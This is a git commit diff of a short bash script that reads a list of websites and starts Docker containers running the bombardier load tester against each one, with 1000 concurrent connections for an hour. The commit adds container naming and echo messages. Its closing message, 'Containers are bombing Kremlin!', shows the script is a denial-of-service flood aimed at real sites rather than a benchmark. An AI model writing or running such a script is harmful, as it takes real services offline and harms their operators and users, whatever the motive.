8fe4c4ca2bd55ecab688efc582c429d8c4aea8dd
Oleksii Lisikh <alisiikh@gmail.com>
2022-02-26 19:37:47 +0100

    Name containers and add extra echos for info

--- run.sh
+++ run.sh
@@ -1,7 +1,11 @@
 #!/bin/bash
 
-IN="websites.txt"
-while IFS= read -r LINE
+input="websites.txt"
+while IFS= read -r line
 do
-  docker run -dti --rm alpine/bombardier -c 1000 -d 3600s -l "$LINE"
-done < "$IN"
+  name=`sed -E 's/^\s*.*:\/\///g' <<< $line`
+  echo Starting $name container...
+  docker run -dti --rm --name "$name" alpine/bombardier -c 1000 -d 3600s -l "$line"
+done < "$input"
+
+echo Containers are bombing Kremlin! Use docker commands to check how it goes.
